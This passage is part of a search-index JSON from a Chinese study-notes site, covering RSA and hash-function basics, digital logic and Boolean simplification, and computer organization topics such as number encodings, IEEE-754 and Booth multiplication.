\\pmod{\\phi(n)}\\)</li> <li> <p>\u516c\u94a5\\((n,e)\\)\uff0c\u79c1\u94a5\\((n,d)\\)</p> </li> <li> <p>\u52a0\u5bc6\u89e3\u5bc6\uff08\u660e\u6587\u662fM\uff09</p> </li> <li> <p>\u52a0\u5bc6\\(C \\equiv M^e \\pmod n\\)</p> </li> <li> <p>\u89e3\u5bc6\\(M \\equiv C^d \\pmod n\\)</p> </li> <li> <p>\u5b89\u5168\u6027\u5206\u6790</p> </li> <li>\u9488\u5bf9\u53c2\u6570\u9009\u62e9<ul> <li>\u5171\u6a21\u653b\u51fb</li> <li>\u4f4e\u6307\u6570\u653b\u51fb</li> </ul> </li> <li>\u5faa\u73af\u653b\u51fb\u6cd5</li> <li>\u56e0\u5b50\u5206\u89e3\u6cd5</li> <li>\u4fa7\u4fe1\u9053\u5b89\u5168\u6027\u5206\u6790(\u7269\u7406\u8bbe\u5907\u4e0a\u7684\u5b89\u5168\u6027\uff09</li> </ul>"},{"location":"course/%E5%AF%86%E7%A0%81%E5%AD%A6/%E5%88%86%E7%BB%84%E5%AF%86%E7%A0%81/#_6","title":"\u5bc6\u7801\u54c8\u5e0c\u51fd\u6570","text":""},{"location":"course/%E5%AF%86%E7%A0%81%E5%AD%A6/%E5%88%86%E7%BB%84%E5%AF%86%E7%A0%81/#hash","title":"Hash\u51fd\u6570\u7684\u5b9a\u4e49","text":"<p>\u628a\u4efb\u610f\u957f\u5ea6\u7684\u8f93\u5165\u901a\u8fc7\u6563\u5217\u7b97\u6cd5\u53d8\u6210\u56fa\u5b9a\u957f\u5ea6\u7684\u8f93\u51fa\uff0c\u8f93\u51fa\u503c\u5c31\u662f\u6563\u5217\u503c\u3002Hash\u7b97\u6cd5\u53c8\u79f0\u6563\u5217\u7b97\u6cd5</p> <p>\u54c8\u5e0c\u51fd\u6570\u7684\u6027\u8d28</p> <ul> <li>\u538b\u7f29</li> <li>\u9ad8\u6548</li> <li>\u5355\u5411\u6027</li> <li>\u5f31\u6297\u78b0\u649e\u6027</li> <li>\u5f3a\u6297\u78b0\u649e\u6027</li> </ul>"},{"location":"course/%E5%AF%86%E7%A0%81%E5%AD%A6/%E5%88%86%E7%BB%84%E5%AF%86%E7%A0%81/#_7","title":"\u751f\u65e5\u653b\u51fb","text":"<p>\u7b2c\u4e00\u7c7b\u751f\u65e5\u653b\u51fb</p> <p>\u627e\u51fa\u5177\u6709\u7ed9\u5b9aHash\u503c\u7684\u4e00\u4e2a\u6d88\u606f\u9700\u8981\u6267\u884c\\(n/2\\)\u6b21\u8fd0\u7b97</p> <p>\u7b2c\u4e8c\u7c7b\u751f\u65e5\u653b\u51fb</p> <p>\u627e\u51fa\u76f8\u540c\u7684Hash\u503c\u7684\u4e24\u4e2a\u6d88\u606f\u9700\\(\\sqrt{n}\\)\u6b21\u8fd0\u7b97</p>"},{"location":"course/%E5%AF%86%E7%A0%81%E5%AD%A6/%E5%88%86%E7%BB%84%E5%AF%86%E7%A0%81/#hamc","title":"HAMC\u7b97\u6cd5\u63cf\u8ff0","text":"<p>\u8f93\u5165\\(b\\)-bit,\u8f93\u51fa\\(n\\)bit</p>"},{"location":"course/%E5%AF%86%E7%A0%81%E5%AD%A6/%E5%88%86%E7%BB%84%E5%AF%86%E7%A0%81/#hash_1","title":"Hash\u51fd\u6570\u7684\u6784\u9020","text":"<p>\u4e3b\u8981\u5f62\u5f0f</p> <ul> <li>\u4f7f\u7528\u538b\u7f29\u51fd\u6570\u8fed\u4ee3\u54c8\u5e0c\u3010MD\u7ed3\u6784\u3011</li> </ul> <p>\u5927\u591a\u6570\u7684\u7ed3\u6784\u3002\u4f8b\u5982 MD5\u3001SHA1\u3001SM3\u7b49\u7b49</p> <ul> <li>\u4f7f\u7528\u5c06\u8f93\u5165\u8f6c\u6362\u6210\u76f8\u540c\u5927\u5c0f\u7684\u8f93\u51fa\u7684\u51fd\u6570\u8fdb\u884c\u8fed\u4ee3\u54c8\u5e0c\u3010\u6d77\u7ef5\u51fd\u6570\u3011</li> </ul> <p>Hash\u51fd\u6570\u7684\u8fed\u4ee3\u7ed3\u6784</p> <ul> <li>\u5355\u5411\u6563\u5217\u51fd\u6570\u7684\u5de5\u4f5c\u6a21\u5f0f</li> </ul> <p></p> <p>\u586b\u5145\u4e3a\u8fd8\u5305\u62ec\u8f93\u5165\u7684\u957f\u5ea6\uff0c\u589e\u52a0\u4e86\u590d\u6742\u5ea6</p> <p>MD5\u7b97\u6cd5\u63cf\u8ff0</p>"},{"location":"course/%E6%95%B0%E5%AD%97%E9%80%BB%E8%BE%91%E4%B8%8E%E7%94%B5%E8%B7%AF/%E6%95%B0%E7%94%B5%E7%AC%94%E8%AE%B0/","title":"\u6570\u7535\u7b14\u8bb0","text":""},{"location":"course/%E6%95%B0%E5%AD%97%E9%80%BB%E8%BE%91%E4%B8%8E%E7%94%B5%E8%B7%AF/%E6%95%B0%E7%94%B5%E7%AC%94%E8%AE%B0/#15","title":"\u7b2c\u4e8c\u7ae0 \uff0815\u5206\uff09","text":"<ul> <li>\u903b\u8f91\u4ee3\u6570\u7684\u57fa\u672c\u516c\u5f0f\u548c\u5e38\u7528\u516c\u5f0f\uff1b</li> <li>n\u903b\u8f91\u4ee3\u6570\u7684\u57fa\u672c\u5b9a\u7406\uff1b </li> <li>n\u903b\u8f91\u51fd\u6570\u7684\u5404\u79cd\u8868\u793a\u65b9\u6cd5\u53ca\u76f8\u4e92\u8f6c\u6362\uff1b</li> <li>n\u903b\u8f91\u51fd\u6570\u7684\u5316\u7b80\u65b9\u6cd5\uff1b</li> </ul>"},{"location":"course/%E6%95%B0%E5%AD%97%E9%80%BB%E8%BE%91%E4%B8%8E%E7%94%B5%E8%B7%AF/%E6%95%B0%E7%94%B5%E7%AC%94%E8%AE%B0/#_2","title":"\u57fa\u672c\u6982\u5ff5","text":"<ul> <li>\u903b\u8f91\u662f\u6307\u4e8b\u7269\u7684\u56e0\u679c\u5173\u7cfb</li> <li>\u903b\u8f91\u4ee3\u6570\u4e2d\u7684\u53d8\u91cf\u79f0\u4e3a\u903b\u8f91\u53d8\u91cf\uff0c\u7528\u5927\u5199\u5b57\u6bcd \u8868\u793a\u3002</li> <li>0\u548c1\u79f0\u4e3a\u903b\u8f91\u5e38\u91cf\uff0c\u5e76\u4e0d\u8868\u793a\u6570\u91cf\u7684\u5927\u5c0f</li> </ul>"},{"location":"course/%E6%95%B0%E5%AD%97%E9%80%BB%E8%BE%91%E4%B8%8E%E7%94%B5%E8%B7%AF/%E6%95%B0%E7%94%B5%E7%AC%94%E8%AE%B0/#_3","title":"\u57fa\u672c\u903b\u8f91\u8fd0\u7b97","text":"<ul> <li>\u57fa\u672c\u903b\u8f91\u8fd0\u7b97\u6709\u4e0e\u3001\u6216\u3001\u975e</li> </ul> <ul> <li>\u590d\u5408\u903b\u8f91\u8fd0\u7b97\u79cd\u7c7b\u8f83\u591a\uff0c\u5e38\u89c1\u7684\u5982\u4e0b</li> </ul> <p>\u5f02\u6216\u7684\u7279\u6027\uff1a</p> <ul> <li>\u5947\u6570\u4e2a1\u76f8\u5f02\u6216\uff0c\u7ed3\u679c\u4e3a1</li> <li>\u5076\u6570\u4e2a1\u76f8\u5f02\u6216\uff0c\u7ed3\u679c\u4e3a0</li> <li>\u4efb\u4f55\u6570\u5f02\u62160\u90fd\u4e0d\u53d8</li> </ul>"},{"location":"course/%E6%95%B0%E5%AD%97%E9%80%BB%E8%BE%91%E4%B8%8E%E7%94%B5%E8%B7%AF/%E6%95%B0%E7%94%B5%E7%AC%94%E8%AE%B0/#_4","title":"\u903b\u8f91\u8fd0\u7b97\u7684\u57fa\u672c\u516c\u5f0f","text":"<p>\u6700\u5e38\u7528\u7684\u662f\u7b2c8\u6761\uff08\u53cd\u6f14\u5f8b\uff09\u548c\u7b2c17\u6761\uff08\u5206\u914d\u5f8b\uff09</p> <p>\u8fd9\u91cc\u7684\u5206\u914d\u5f8b\u53ef\u4ee5\u7406\u89e3\u4e3a\uff1a\u4e58\u6cd5\u5bf9\u52a0\u6cd5\u4e5f\u80fd\u5206\u914d\uff0c\u52a0\u6cd5\u5bf9\u4e58\u6cd5\u4e5f\u80fd\u5206\u914d</p>"},{"location":"course/%E6%95%B0%E5%AD%97%E9%80%BB%E8%BE%91%E4%B8%8E%E7%94%B5%E8%B7%AF/%E6%95%B0%E7%94%B5%E7%AC%94%E8%AE%B0/#_5","title":"\u63a8\u8bba\u516c\u5f0f","text":"<ul> <li> <p>\u5438\u6536\u5f8b\uff1a\u77ed\u9879\u5438\u6536\u957f\u9879\uff08\u957f\u9879\u5305\u542b\u77ed\u9879\u7684\u524d\u63d0\u4e4b\u4e0b\uff09</p> </li> <li> <p>\u53cd\u53d8\u91cf\u62b5\u6d88\uff1a\u4e24\u4e2a\u9879\u4e2d\u542b\u6709\u53cd\u53d8\u91cf\uff0c\u5219\u53cd\u53d8\u91cf\u53ef\u4ee5\u53bb\u9664\uff08\u4e24\u4e2a\u53d8\u91cf\u6570\u76ee\u548c\u79cd\u7c7b\u76f8\u540c\uff09</p> </li> <li> <p>\u6df7\u5408\u53d8\u91cf\u5438\u6536\uff1a\u6b63\u8d1f\u76f8\u5bf9\uff0c\u4f59\u5b8c\u5168</p> </li> </ul> <p></p>"},{"location":"course/%E6%95%B0%E5%AD%97%E9%80%BB%E8%BE%91%E4%B8%8E%E7%94%B5%E8%B7%AF/%E6%95%B0%E7%94%B5%E7%AC%94%E8%AE%B0/#_6","title":"\u903b\u8f91\u51fd\u6570","text":"<p>\u4e8b\u7269\u4e4b\u95f4\u7684\u903b\u8f91\u5173\u7cfb\u53ef\u4ee5\u901a\u8fc7\u63cf\u8ff0\u903b\u8f91\u8f93 \u5165\u53d8\u91cf\u548c\u8f93\u51fa\u53d8\u91cf\u7684\u53d8\u5316\u5173\u7cfb\u6765\u786e\u5b9a\uff0c\u8fd9 \u662f\u4e00\u79cd\u51fd\u6570\u5173\u7cfb\uff0c\u79f0\u4e3a\u903b\u8f91\u51fd\u6570\u3002\u8bb0\u4f5c\\(Y = F(A,B,C,\\cdots\\cdots)\\)\uff0c</p> <p>\u4f8b\u5982\\(Y = A\\cdot B\\)\u5c31\u662f\u4e00\u4e2a\u4e24\u8f93\u5165\u4e00\u8f93\u51fa\u7684\u903b\u8f91\u51fd\u6570</p> <p>\u903b\u8f91\u51fd\u6570\u7684\u8868\u73b0\u5f62\u5f0f</p> <p>\u4e3e\u91cd\u6bd4\u8d5b\u4e2d\u6709A\u3001B\u3001C\u4e09\u4e2a\u88c1\u5224\uff0cA\u4e3a \u4e3b\u88c1\uff0cB\u3001C\u4e3a\u526f\u88c1\uff0c\u89c4\u5b9a\u5f53\u4e3b\u88c1\u548c\u81f3\u5c11\u4e00 \u4e2a\u526f\u88c1\u8ba4\u5b9a\u6210\u7ee9\u6709\u6548\u65f6\uff0c\u5219\u8fd0\u52a8\u5458\u6210\u7ee9Y\u6709 \u6548\uff1b\u5426\u5219\u65e0\u6548</p> <p>\u8f93\u5165\u53d8\u91cfA\u3001B\u3001C\u5206\u522b\u4ee3\u8868\u4e3b \u88c1\u548c\u4e24\u4e2a\u526f\u88c1\uff0c\u540c\u610f\u4e3a1\uff1b\u8f93\u51fa\u53d8\u91cfY\u4ee3\u8868 \u8fd0\u52a8\u5458\u6210\u7ee9\uff0c\u6709\u6548\u4e3a1</p> <ol> <li>\u771f\u503c\u8868</li> </ol> <p></p> <ol> <li>\u903b\u8f91\u51fd\u6570\u5f0f</li> </ol> <p></p> <ol> <li>\u903b\u8f91\u56fe</li> </ol> <p></p> <ol> <li>\u6ce2\u5f62\u56fe</li> </ol> <p></p>"},{"location":"course/%E6%95%B0%E5%AD%97%E9%80%BB%E8%BE%91%E4%B8%8E%E7%94%B5%E8%B7%AF/%E6%95%B0%E7%94%B5%E7%AC%94%E8%AE%B0/#_7","title":"\u903b\u8f91\u51fd\u6570\u7684\u5316\u7b80","text":"<ul> <li>\u516c\u5f0f\u6cd5\uff1a\u5e03\u5c14\u4ee3\u6570</li> <li>\u56fe\u5f62\u6cd5\uff1a\u5361\u8bfa\u56fe</li> </ul>"},{"location":"course/%E6%95%B0%E5%AD%97%E9%80%BB%E8%BE%91%E4%B8%8E%E7%94%B5%E8%B7%AF/%E6%95%B0%E7%94%B5%E7%AC%94%E8%AE%B0/#_8","title":"\u53d8\u5f62\u516c\u5f0f","text":"<ul> <li>\u53cd\u51fd\u6570\uff1a\u5168\u90e8\u53d6\u53cd</li> <li>\u5bf9\u5076\u5f0f\uff1a\u9664\u4e86\u53d8\u91cf\u672c\u8eab\uff0c\u5176\u4f59\u5168\u90e8\u53d6\u53cd</li> </ul>"},{"location":"course/%E6%95%B0%E5%AD%97%E9%80%BB%E8%BE%91%E4%B8%8E%E7%94%B5%E8%B7%AF/%E6%95%B0%E7%94%B5%E7%AC%94%E8%AE%B0/#35","title":"\u7b2c\u56db\u7ae0(35\u5206)","text":"<ul> <li> <p>\u7ec4\u5408\u7535\u8def\u7684\u5206\u6790</p> </li> <li> <p>\u7ec4\u5408\u7535\u8def\u7684\u8bbe\u8ba1\uff1a</p> </li> <li> <p>\u7528\u95e8\u7535\u8def\u6784\u6210\uff1a</p> <pre><code>graph LR\nS(\u5199\u771f\u503c\u8868)--\u5199\u5f0f--&gt;L(\u903b\u8f91\u5f0f)--\u5316\u7b80--&gt;E(\u6700\u7b80\u4e0e\u6216\u5f0f)\nS--\u586b\u56fe--&gt;K(\u5361\u8bfa\u56fe)--\u5316\u7b80--&gt;E\n</code></pre> </li> <li> <p>\u7528\u4e2d\u89c4\u6a21\u7ec4\u4ef6\u8bbe\u8ba1\u903b\u8f91\u7535\u8def</p> </li> <li> <p>\u5178\u578b\u7ec4\u4ef6</p> </li> <li> <p>\u7f16\u7801\u5668</p> </li> <li>\u8bd1\u7801\u5668</li> <li>\u6570\u636e\u9009\u62e9\u5668</li> <li>\u52a0\u6cd5\u5668</li> <li> <p>\u6570\u503c\u6bd4\u8f83\u5668</p> </li> <li> <p>\u4e86\u89e3PLD\u7684\u57fa\u672c\u7535\u8def\u7ed3\u6784</p> </li> </ul>"},{"location":"course/%E6%95%B0%E5%AD%97%E9%80%BB%E8%BE%91%E4%B8%8E%E7%94%B5%E8%B7%AF/%E6%95%B0%E7%94%B5%E7%AC%94%E8%AE%B0/#_9","title":"\u6982\u8ff0","text":""},{"location":"course/%E6%95%B0%E5%AD%97%E9%80%BB%E8%BE%91%E4%B8%8E%E7%94%B5%E8%B7%AF/%E6%95%B0%E7%94%B5%E7%AC%94%E8%AE%B0/#_10","title":"\u8bbe\u8ba1","text":""},{"location":"course/%E8%AE%A1%E7%BB%84/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/","title":"\u8ba1\u7b97\u673a\u7ec4\u6210\u539f\u7406","text":""},{"location":"course/%E8%AE%A1%E7%BB%84/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/#1","title":"\u7b2c1\u7ae0 \u8ba1\u7b97\u673a\u7cfb\u7edf\u6982\u8ff0","text":""},{"location":"course/%E8%AE%A1%E7%BB%84/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/#_2","title":"\u8ba1\u7b97\u673a\u7ed3\u6784","text":"<ul> <li>\u51af\u8bfa\u4f9d\u66fc\u7ed3\u6784</li> </ul> <ul> <li>\u54c8\u4f5b\u7ed3\u6784</li> </ul>"},{"location":"course/%E8%AE%A1%E7%BB%84/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/#_3","title":"\u8ba1\u7b97\u673a\u7684\u5de5\u4f5c\u8fc7\u7a0b","text":"<pre><code>---\ntitle: \u8ba1\u7b97\u673a\u7684\u5355\u5468\u671f\u6267\u884c\u8fc7\u7a0b\n---\nflowchart LR\nsubgraph As [\u53d6\u6307\u4ee4]\nA1(\"PC--&gt;MAR\"):::A--&gt;A2(\"M(MAR)--&gt;MDR\"):::A--&gt;A3(\"PC+1--&gt;PC\"):::A--&gt;A4(\"MDR--&gt;IR\"):::A\nclassDef A fill:#f96, stroke:111, stroke-width:3px\nend\n\nA4-.-&gt;\u5206\u6790\u6307\u4ee4--&gt;B1\nsubgraph Bs [\u6267\u884c\u6307\u4ee4]\nB1(\"IR(X)--&gt;MAR\"):::B--&gt;B2(\"M(MAR)--&gt;MDR\"):::B--&gt;B3(\"MDR--&gt;ACC\"):::B\nclassDef B fill:#f9f, stroke:111, stroke-width:3px\nend\n</code></pre>"},{"location":"course/%E8%AE%A1%E7%BB%84/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/#_4","title":"\u8ba1\u7b97\u673a\u7684\u6027\u80fd\u6307\u6807","text":"<ul> <li>\u5b57\u957f</li> <li>\u5b58\u50a8\u5bb9\u91cf</li> <li>\u8fd0\u7b97\u901f\u5ea6\uff08\u8fd9\u4e2a\u8981\u5b66\u4f1a\u7b97\uff09</li> <li>\u4e3b\u9891</li> <li>\u6307\u4ee4\u6267\u884c\u901f\u5ea6</li> <li>CPI</li> <li>FLOPS</li> <li>\u53ef\u9760\u6027</li> </ul>"},{"location":"course/%E8%AE%A1%E7%BB%84/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/#2","title":"\u7b2c2\u7ae0 \u8fd0\u7b97\u65b9\u6cd5\u548c\u8fd0\u7b97\u5668","text":""},{"location":"course/%E8%AE%A1%E7%BB%84/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/#_5","title":"\u6570\u636e\u7684\u8868\u793a","text":""},{"location":"course/%E8%AE%A1%E7%BB%84/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/#_6","title":"\u8ba1\u7b97\u673a\u4e2d\u5e38\u7528\u7684\u8868\u793a\u65b9\u6cd5","text":"<ul> <li> <p>\u539f\u7801\uff1a\u548c\u771f\u503c\u5bf9\u5e94\u3002\u7b26\u53f7\u4f4d<code>0</code>\u8868\u793a\u6b63\u6570\uff0c<code>1</code>\u8868\u793a\u8d1f\u6570\u3002\u8868\u793a\u8303\u56f4\u662f\\([-(2^{n-1}-1),2^{n-1}-1]\\)</p> </li> <li> <p>\u8865\u7801\uff1a\u6b63\u6570\u7684\u8865\u7801\u7b49\u4e8e\u539f\u7801\uff0c\u8d1f\u6570\u7684\u8865\u7801\u53ef\u4ee5\u5c06\u539f\u7801\u7684\u51fa\u6700\u540e\u4e00\u4f4d1\u5f00\u59cb\uff08\u4e0d\u5305\u62ec\uff09\uff0c\u5f80\u524d\u5c06\u6240\u6709\u4f4d\u53d6\u53cd\u5f97\u5230\u3002\u8868\u793a\u8303\u56f4\u662f\\([-2^{n-1},2^{n-1}-1]\\)</p> </li> <li> <p>\u79fb\u7801\uff1a\u79fb\u7801\u7684\u5b9e\u8d28\u662f\u5c06\u6709\u7b26\u53f7\u6570\u53d8\u6210\u65e0\u7b26\u53f7\u6570\u3002\u7ecf\u5e38\u7528\u6765\u6bd4\u8f83\u4e24\u4e2a\u6570\u7684\u5927\u5c0f\u3002\u5c06\u539f\u7801\u7684\u7b26\u53f7\u4f4d\u53d6\u53cd\u5373\u53ef\uff08\u6b63\u8d1f\u6570\u4e00\u6837\u5904\u7406\uff09\u3002\u5904\u7406\u5b8c\u540e\u53ef\u4ee5\u5f53\u505a\u65e0\u7b26\u53f7\u6574\u6570\u6309\u4f4d\u6bd4\u8f83\uff0c\u8868\u793a\u8303\u56f4\u662f\\([0,2^n-1]\\)</p> </li> </ul> <ul> <li>\\([X+Y]_\u8865 = [X]_\u8865+[Y]_\u8865\\)</li> <li>\\([X+Y]_\u79fb = [X]_\u79fb+[Y]_\u8865\\)</li> </ul>"},{"location":"course/%E8%AE%A1%E7%BB%84/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/#_7","title":"\u5b9a\u70b9\u6570\u7684\u8868\u793a","text":"<p>\u7b26\u53f7\u4f4d\u56fa\u5b9a\uff0c\u5c0f\u6570\u70b9\u4f4d\u7f6e\u56fa\u5b9a\u3002\uff08\u5e38\u89c1\u7684\u662f\u7eaf\u6574\u6570\u6216\u8005\u7eaf\u5c0f\u6570\uff09</p>"},{"location":"course/%E8%AE%A1%E7%BB%84/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/#_8","title":"\u6d6e\u70b9\u6570\u7684\u8868\u793a","text":"<p> $$ N=M \\times 2^{E} $$ \u5176\u4e2d\\(N\\)\u662f\u6d6e\u70b9\u6570\u7684\u771f\u503c\uff0c\\(M\\)\u662f\u5c3e\u7801\uff0c\\(E\\)\u662f\u9636\u7801</p> <ul> <li>\u7b26\u53f7\u7531\\(M\\)\u7684\u7b26\u53f7\u51b3\u5b9a</li> <li>\u7cbe\u5ea6\u7531\\(M\\)\u7684\u4f4d\u6570\u51b3\u5b9a</li> <li>\u8303\u56f4\u7531\\(E\\)\u7684\u4f4d\u6570\u51b3\u5b9a</li> </ul>"},{"location":"course/%E8%AE%A1%E7%BB%84/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/#ieee-754","title":"IEEE-754\u683c\u5f0f","text":"<ul> <li> <p>IEEE-754\u4e2d\u6d6e\u70b9\u6570\u7684\u8868\u793a\u7684\u683c\u5f0f\u4e3a\\(N=(-1)^S \\times 2^{E'}\\times(1+M)\\)\uff0c\u5176\u4e2d\\(S\\)\u8868\u793a\u7b26\u53f7\u4f4d\uff1b\\(E'\\)\u8868\u793a\u9636\u7801\u7684\u79fb\u7801\uff0c\u4e5f\u53ef\u4ee5\u8868\u793a\u4e3a\\(E'=E-Bias\\)\uff1b\\(M\\)\u8868\u793a\u5c3e\u7801\u3002</p> </li> <li> <p>\u7b26\u53f7\u4f4d\u53ea\u6709\u4e00\u4f4d\uff0c\\(0\\)\u8868\u793a\u6b63\u6570\uff0c\\(1\\)\u8868\u793a\u8d1f\u6570</p> </li> <li> <p>\u5355\u7cbe\u5ea6\u6d6e\u70b9\u6570\u7684\u7ed3\u6784\uff1a\\(S(1) + E(8) + M(23)\\)</p> </li> <li> <p>\u53cc\u7cbe\u5ea6\u6d6e\u70b9\u6570\u7684\u7ed3\u6784\uff1a\\(S(1) + E(11) + M(52)\\)</p> </li> <li> <p>\u7279\u6b8a\u7684\u4e00\u4e9b\u6d6e\u70b9\u6570</p> </li> </ul> \u9636\u7801 \u5c3e\u7801 \u6570\u636e 0 0 0 0 \u975e0 \u975e\u89c4\u683c\u6570 \u51681 0 \u65e0\u7a77\u5927 \u51681 \u975e0 \u975e\u6570"},{"location":"course/%E8%AE%A1%E7%BB%84/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/#_9","title":"\u5b9a\u70b9\u6570\u7684\u52a0\u51cf\u6cd5","text":"<p>\u8865\u7801\u52a0\u6cd5\u516c\u5f0f $$ [A+B]_\u8865=[A]_\u8865+[B]_\u8865 $$ \u6ea2\u51fa\u5224\u522b</p> <ul> <li>\u4e0a\u6ea2\uff1a\u7ed3\u679c\u5927\u4e8e\u6700\u5927\u8868\u793a\u8303\u56f4</li> <li>\u4e0b\u6ea2\uff1a\u7ed3\u679c\u5c0f\u4e8e\u6700\u5c0f\u8868\u793a\u8303\u56f4</li> </ul> <ul> <li>\u8fd0\u7b97\u7b26\u6bd4\u8f83\u6cd5\uff1a\u53ea\u6709\u8fd0\u7b97\u7b26\u76f8\u540c\u65f6\u624d\u53ef\u80fd\u6ea2\u51fa\uff0c\u624d\u8fdb\u884c\u8fdb\u4f4d\u5224\u65ad\u6ea2\u51fa\u60c5\u51b5</li> <li>\u53d8\u5f62\u8865\u7801\u6cd5\uff08\u53cc\u7b26\u53f7\u4f4d\uff09\uff1a</li> <li>\u4f7f\u7528\u53cc\u7b26\u53f7\u4f4d\u8fdb\u884c\u52a0\u6cd5\u8fd0\u7b97</li> <li>\u7ed3\u679c\u7684\u7b26\u53f7\u4f4d\u76f8\u5f02\u662f\u8868\u793a\u6ea2\u51fa\uff0c\\(01\\)\u8868\u793a\u4e0a\u6ea2\u51fa\uff0c\\(10\\)\u8868\u793a\u4e0b\u6ea2\u51fa</li> </ul> <p>\u8865\u7801\u51cf\u6cd5 $$ [A-B]_\u8865=[A]_\u8865+[-B]_\u8865 $$</p>"},{"location":"course/%E8%AE%A1%E7%BB%84/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/#_10","title":"\u5b9a\u70b9\u6570\u7684\u4e58\u6cd5","text":"<p>\\(X=-0.1011,Y=0.1101\\)\uff0c\u8ba1\u7b97\\(X\\times Y\\) $$ \\begin{aligned} &amp;\u90e8\u5206\u79ef &amp;&amp;\u4e58\u6570 &amp;&amp;&amp;\u64cd\u4f5c\u8bf4\u660e\\  &amp;{\\color{OliveGreen}00.0000}   &amp;&amp;0.11010 &amp;&amp;&amp;\u521d\u59cb\u5316\u90e8\u5206\u79efP_0\\ +&amp;{\\color{Mahogany}00.1011}   &amp;&amp;  &amp;&amp;&amp;{\\color{Mahogany}\u5224\u65ady_ny_{n+1}=10\uff0c+[-X]\u8865}\\ --&amp;-----\\  &amp;00.1011 &amp;&amp; &amp;&amp;&amp;\u6c42\u548c\\  &amp;{\\color{OliveGreen}00.0101}   &amp;&amp;1 \\quad 0.1101 &amp;&amp;&amp;\u53f3\u79fb\u4e00\u4f4d\\ +&amp;{\\color{Mahogany}11.0101}   &amp;&amp;  &amp;&amp;&amp;{\\color{Mahogany}\u5224\u65ady_ny=01\uff0c+[X]\u8865}\\ --&amp;-----\\  &amp;11.1010 &amp;&amp; &amp;&amp;&amp;\u6c42\u548c\\  &amp;{\\color{OliveGreen}11.1101}   &amp;&amp;01 \\quad 0.110 &amp;&amp;&amp;\u53f3\u79fb\u4e00\u4f4d\\ +&amp;{\\color{Mahogany}00.1011}   &amp;&amp;  &amp;&amp;&amp;{\\color{Mahogany}\u5224\u65ady_ny=10\uff0c+[-X]\u8865}\\ --&amp;-----\\  &amp;00.1000 &amp;&amp; &amp;&amp;&amp;\u6c42\u548c\\  &amp;{\\color{OliveGreen}00.0100}   &amp;&amp;001 \\quad 0.11 &amp;&amp;&amp;\u53f3\u79fb\u4e00\u4f4d\\ +&amp;{\\color{Mahogany}00.0000}   &amp;&amp;  &amp;&amp;&amp;{\\color{Mahogany}\u5224\u65ady_ny\\ --&amp;-----\\  &amp;00.0100 &amp;&amp; &amp;&amp;&amp;\u6c42\u548c\\  &amp;{\\color{OliveGreen}00.0010}   &amp;&amp;0001 \\quad 0.1 &amp;&amp;&amp;\u53f3\u79fb\u4e00\u4f4d\\ +&amp;{\\color{Mahogany}11.0101}   &amp;&amp;  &amp;&amp;&amp;{\\color{Mahogany}\u5224\u65ady_ny_{n+1}=01\uff0c+[X]_\u8865}\\ --&amp;-----\\  &amp;{\\color{NavyBlue}11.1011} &amp;&amp;0001 &amp;&amp;&amp;\u6c42\u548c\uff0c\u5f97\u5230\u7ed3\u679c\\}=11\uff0c+0</p> <p>\\end{aligned} $$</p>"},{"location":"course/%E8%AE%A1%E7%BB%84/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/#_11","title":"\u6d6e\u70b9\u6570\u7684\u52a0\u51cf\u6cd5","text":""},{"location":"course/%E8%AE%A1%E7%BB%84/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/#3","title":"\u7b2c3\u7ae0 \u5b58\u50a8\u7cfb\u7edf","text":""},{"location":"course/%E8%AE%A1%E7%BB%84/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/#_12","title":"\u6982\u8ff0","text":""},{"location":"course/%E8%AE%A1%E7%BB%84/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/#_13","title":"\u5206\u7c7b","text":"\\[ \u5b58\u50a8\u5668\\begin{cases}     \u6309\u5b58\u50a8\u4ecb\u8d28&amp;\\begin{cases}     \u534a\u5bfc\u4f53\u5b58\u50a8\u5668(\u5e38\u7528\u4f5c\u4e3b\u5185\u5b58)\\\\     \u78c1\u8868\u9762\u5b58\u50a8\u5668(\u5e38\u7528\u4f5c\u5916\u5b58)\\\\     \u5149\u76d8\u5b58\u50a8\u5668(CD-ROM,WORM,\u53ef\u64e6\u5199\u5149\u76d8)     \\end{cases}\\\\\\\\     \u6309\u6570\u636e\u5b58\u53d6\u65b9\u5f0f&amp;\\begin{cases}     \u968f\u673a\u5b58\u53d6\u5b58\u50a8\u5668(SRAM,DRAM)\\\\     \u987a\u5e8f\u5b58\u50a8\u5b58\u50a8\u5668\\\\     \u76f4\u63a5\u5b58\u53d6\u5b58\u50a8\u5668     \\end{cases}\\\\\\\\     \u6309\u5728\u8ba1\u7b97\u673a\u4e2d\u7684\u4f5c\u7528&amp;\\begin{cases}     \u4e3b\u5b58\u50a8\u5668\\\\     \u5916\u5b58\u50a8\u5668\\\\     \u9ad8\u901f\u7f13\u51b2\u5b58\u50a8\u5668     \\end{cases} \\end{cases} 